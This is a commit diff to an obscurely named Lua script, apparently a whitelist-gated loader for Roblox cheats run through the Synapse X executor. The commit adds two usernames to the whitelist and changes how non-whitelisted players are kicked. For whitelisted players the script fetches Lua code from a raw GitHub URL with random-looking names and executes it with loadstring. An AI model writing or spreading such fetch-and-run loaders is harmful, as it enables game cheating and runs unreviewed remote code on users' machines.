ec12aa1e2a5358f9155323742e98e33ddec614e1
shadowlords <66021111+shadowlords@users.noreply.github.com>
2020-10-15 14:39:14 +0200

    Update asdijasd.lua

--- asdijasd.lua
+++ asdijasd.lua
@@ -5,12 +5,15 @@ whitelist = {
     ["Code_Leaked"] = true,
     ["RxPoweringModeration"] = true,
     ["SuperAngelo177"] = true,
-    ["XxXAmyGamer_GirlXxX"] = true
+    ["XxXAmyGamer_GirlXxX"] = true,
+    ["Ramon123454321"] = true,
+    ["Vip123yesthatsme"] = true
 }
 
 if syn then
     if whitelist[game.Players.LocalPlayer.Name] then
             loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua', true))()
-else game:Shutdown()
+else game.Players.LocalPlayer:Kick("You aren't whitelisted!")
 end
+else game.Players.LocalPlayer:Kick("it seems like your exploit isn't supported")
 end
